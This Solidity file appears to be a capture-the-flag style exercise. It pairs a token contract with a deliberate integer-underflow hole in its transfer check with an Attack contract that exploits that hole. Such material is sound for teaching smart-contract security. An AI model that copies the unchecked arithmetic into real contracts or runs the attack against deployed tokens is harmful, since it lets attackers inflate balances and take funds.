// SPDX-License-Identifier: MIT

/****Og Contract****/

pragma solidity ^0.6.0;
contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0,'value should be greater than 0 eth');
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

/**** attack Contract****/

contract Attack{
    Token instanceAddress;

    function attack(address _instanceAddress)public {
        instanceAddress = Token(_instanceAddress);
        instanceAddress.transfer(_instanceAddress,30); //uint overflow
    }
}